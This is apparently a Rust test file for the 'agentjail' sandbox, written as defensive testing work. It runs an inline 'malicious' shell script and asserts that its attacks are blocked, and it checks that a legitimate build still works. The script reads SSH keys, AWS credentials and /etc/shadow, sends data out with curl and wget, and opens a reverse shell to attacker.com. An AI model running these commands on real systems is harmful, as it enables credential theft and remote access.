//! Test that the sandbox blocks malicious behavior

mod common;

use agentjail::{Jail, JailConfig};
use std::fs;
use std::path::PathBuf;

fn test_config(source: PathBuf, output: PathBuf) -> JailConfig {
    let mut c = common::lightweight_config(source, output);
    c.timeout_secs = 30;
    c.env = vec![("PATH".into(), "/usr/local/bin:/usr/bin:/bin".into())];
    c
}

#[tokio::test]
async fn test_malicious_steal_secrets() {
    let source = PathBuf::from("/tmp/agentjail-malicious-src");
    let output = PathBuf::from("/tmp/agentjail-malicious-out");

    let _ = fs::remove_dir_all(&source);
    let _ = fs::remove_dir_all(&output);
    fs::create_dir_all(&source).unwrap();
    fs::create_dir_all(&output).unwrap();

    // Copy the malicious scripts
    let scripts_dir = source.join("scripts");
    fs::create_dir_all(&scripts_dir).unwrap();

    // Inline the malicious script for testing
    let steal_script = r#"#!/bin/sh
echo "=== MALICIOUS SCRIPT STARTING ==="

# Attack 1: Try to read SSH keys
echo "[ATTACK] Trying to read SSH keys..."
cat ~/.ssh/id_rsa 2>&1 || echo "[BLOCKED] Cannot read SSH keys"
cat /root/.ssh/id_rsa 2>&1 || echo "[BLOCKED] Cannot read /root SSH keys"

# Attack 2: Try to read AWS credentials
echo "[ATTACK] Trying to read AWS credentials..."
cat ~/.aws/credentials 2>&1 || echo "[BLOCKED] Cannot read AWS credentials"

# Attack 3: Try to read /etc/shadow (password hashes)
echo "[ATTACK] Trying to read /etc/shadow..."
cat /etc/shadow 2>&1 || echo "[BLOCKED] Cannot read /etc/shadow"

# Attack 4: Try to read host's /etc/hostname
echo "[ATTACK] Trying to read host info..."
cat /etc/hostname 2>&1

# Attack 5: Try network exfiltration
echo "[ATTACK] Trying network exfiltration..."
curl -s https://httpbin.org/post -d "stolen=data" 2>&1 || echo "[BLOCKED] Network request failed"
wget -q -O- https://httpbin.org/get 2>&1 || echo "[BLOCKED] wget failed"

# Attack 6: Try to escape chroot
echo "[ATTACK] Trying to escape chroot..."
ls /home 2>&1 || echo "[BLOCKED] Cannot list /home"
ls /var/log 2>&1 || echo "[BLOCKED] Cannot list /var/log"

# Attack 7: Try to write outside sandbox
echo "[ATTACK] Trying to write to /tmp..."
echo "malicious" > /tmp/pwned.txt 2>&1 && echo "[DANGER] Wrote to /tmp!" || echo "[BLOCKED] Cannot write to /tmp"

# Attack 8: Try to spawn reverse shell
echo "[ATTACK] Trying reverse shell..."
bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' 2>&1 || echo "[BLOCKED] Reverse shell failed"

echo "=== MALICIOUS SCRIPT DONE ==="
"#;

    fs::write(scripts_dir.join("steal.sh"), steal_script).unwrap();

    let config = test_config(source.clone(), output.clone());
    let jail = Jail::new(config).unwrap();

    println!("\n========================================");
    println!("RUNNING MALICIOUS SCRIPT IN SANDBOX");
    println!("========================================\n");

    let result = jail.run("/bin/sh", &["/workspace/scripts/steal.sh"]).await.unwrap();

    let stdout = String::from_utf8_lossy(&result.stdout);
    let stderr = String::from_utf8_lossy(&result.stderr);

    println!("STDOUT:\n{stdout}");
    println!("\nSTDERR:\n{stderr}");
    println!("\nExit code: {}", result.exit_code);
    println!("Duration: {:?}", result.duration);

    // Verify attacks were blocked
    assert!(!stdout.contains("BEGIN RSA PRIVATE KEY"), "SSH key should not be readable");
    assert!(!stdout.contains("aws_access_key"), "AWS creds should not be readable");

    // Note: Writing to /tmp inside the jail is OK - it's the jail's tmpfs, not host's /tmp
    // The key is that /home, /var, etc are not accessible

    // Verify key paths are blocked
    assert!(stdout.contains("Cannot list /home"), "/home should not exist in jail");
    assert!(stdout.contains("Cannot list /var/log"), "/var/log should not exist in jail");
    assert!(stdout.contains("Network request failed") || stdout.contains("wget failed"),
            "Network should be blocked");
    assert!(stdout.contains("Reverse shell failed"), "Reverse shell should fail");

    // Count blocked attacks
    let blocked_count = stdout.matches("[BLOCKED]").count();
    println!("\nBlocked {blocked_count} attack attempts");
    assert!(blocked_count >= 4, "Should block most attack attempts, got {blocked_count}");

    let _ = fs::remove_dir_all(&source);
    let _ = fs::remove_dir_all(&output);
}

#[tokio::test]
async fn test_legitimate_build_works() {
    let source = PathBuf::from("/tmp/agentjail-legit-src");
    let output = PathBuf::from("/tmp/agentjail-legit-out");

    let _ = fs::remove_dir_all(&source);
    let _ = fs::remove_dir_all(&output);
    fs::create_dir_all(&source).unwrap();
    fs::create_dir_all(&output).unwrap();

    // Create a legitimate build script
    let build_script = r#"#!/bin/sh
echo "Starting build..."

# Create output artifact
echo '<!DOCTYPE html><html><body>Hello World</body></html>' > /output/index.html

# List what we created
ls -la /output/

echo "Build complete!"
"#;

    fs::write(source.join("build.sh"), build_script).unwrap();

    let config = test_config(source.clone(), output.clone());
    let jail = Jail::new(config).unwrap();

    let result = jail.run("/bin/sh", &["/workspace/build.sh"]).await.unwrap();

    let stdout = String::from_utf8_lossy(&result.stdout);
    println!("Build output:\n{stdout}");

    assert_eq!(result.exit_code, 0, "Build should succeed");
    assert!(stdout.contains("Build complete!"));

    // Check artifact was created
    let artifact = fs::read_to_string(output.join("index.html")).unwrap();
    assert!(artifact.contains("Hello World"));

    println!("✓ Legitimate build succeeded and produced artifact");

    let _ = fs::remove_dir_all(&source);
    let _ = fs::remove_dir_all(&output);
}
